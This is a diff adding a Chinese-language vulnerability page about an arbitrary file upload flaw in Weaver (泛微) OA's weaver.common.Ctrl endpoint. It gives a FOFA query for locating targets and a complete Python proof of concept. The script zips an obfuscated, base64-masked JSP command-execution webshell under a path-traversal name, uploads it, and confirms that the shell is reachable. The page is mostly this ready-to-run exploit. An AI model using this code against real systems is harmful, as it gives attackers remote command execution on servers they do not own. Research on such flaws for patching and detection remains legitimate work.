@@ -1,0 +1,85 @@
+<h1 id="泛微OA-weaver-common-Ctrl-任意文件上传漏洞"><a href="#泛微OA-weaver-common-Ctrl-任意文件上传漏洞" class="headerlink" title="泛微OA weaver.common.Ctrl 任意文件上传漏洞"></a>泛微OA weaver.common.Ctrl 任意文件上传漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>泛微OA weaver.common.Ctrl 存在任意文件上传漏洞，攻击者通过漏洞可以上传webshell文件控制服务器</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>泛微OA </p>
+</blockquote>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
+<p>[!NOTE]</p>
+<p>app=”泛微-协同办公OA”</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>存在漏洞的路径为</p>
+<pre><code>/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&amp;arg1=validateApp
+</code></pre>
+<p>请求包为</p>
+<p><img src="http://wikioss.peiqi.tech/vuln/fanwei-36.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<p>​    使用POC文件上传</p>
+<p><img src="http://wikioss.peiqi.tech/vuln/fanwei-37.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><pre><code class="python">import zipfile
+import random
+import sys
+import requests
+
+
+
+def generate_random_str(randomlength=16):
+  random_str = &#39;&#39;
+  base_str = &#39;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#39;
+  length = len(base_str) - 1
+  for i in range(randomlength):
+    random_str += base_str[random.randint(0, length)]
+  return random_str
+
+mm = generate_random_str(8)
+
+webshell_name1 = mm+&#39;.jsp&#39;
+webshell_name2 = &#39;../../../&#39;+webshell_name1
+
+def file_zip():
+    shell = &quot;&quot;&quot;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%@ page import=&quot;sun.misc.BASE64Decoder&quot; %&gt;
+&lt;%
+    if(request.getParameter(&quot;cmd&quot;)!=null){
+        BASE64Decoder decoder = new BASE64Decoder();
+        Class rt = Class.forName(new String(decoder.decodeBuffer(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;)));
+        Process e = (Process)
+                rt.getMethod(new String(decoder.decodeBuffer(&quot;ZXhlYw==&quot;)), String.class).invoke(rt.getMethod(new
+                        String(decoder.decodeBuffer(&quot;Z2V0UnVudGltZQ==&quot;))).invoke(null, new
+                        Object[]{}), request.getParameter(&quot;cmd&quot;) );
+        java.io.InputStream in = e.getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print(&quot;&lt;pre&gt;&quot;);
+        while((a=in.read(b))!=-1){
+            out.println(new String(b));
+        }
+        out.print(&quot;&lt;/pre&gt;&quot;);
+    }
+%&gt;
+    &quot;&quot;&quot;   ## 替换shell内容
+    zf = zipfile.ZipFile(mm+&#39;.zip&#39;, mode=&#39;w&#39;, compression=zipfile.ZIP_DEFLATED)
+    zf.writestr(webshell_name2, shell)
+
+def GetShell(urllist):
+    file_zip()
+    print(&#39;上传文件中&#39;)
+    urls = urllist + &#39;/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&amp;arg1=validateApp&#39;
+    file = [(&#39;file1&#39;, (mm+&#39;.zip&#39;, open(mm + &#39;.zip&#39;, &#39;rb&#39;), &#39;application/zip&#39;))]
+    requests.post(url=urls,files=file,timeout=60, verify=False)
+    GetShellurl = urllist+&#39;/cloudstore/&#39;+webshell_name1
+    GetShelllist = requests.get(url = GetShellurl)
+    if GetShelllist.status_code == 200:
+        print(&#39;利用成功webshell地址为:&#39;+GetShellurl)
+    else:
+        print(&#39;未找到webshell利用失败&#39;)
+
+def main():
+    if (len(sys.argv) == 2):
+        url = sys.argv[1]
+        GetShell(url)
+    else:
+        print(&quot;python3 poc.py http://xx.xx.xx.xx&quot;)
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://github.com/GTX8090TI/GTX8090TI.github.io/blob/6dd04a19bbc4fcef436e0b2f05c15bc98ac0c852/2021/05/02/%E6%B3%9B%E5%BE%AEOA-%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/index.html" target="_blank" rel="noopener">原漏洞公开地址</a></p>
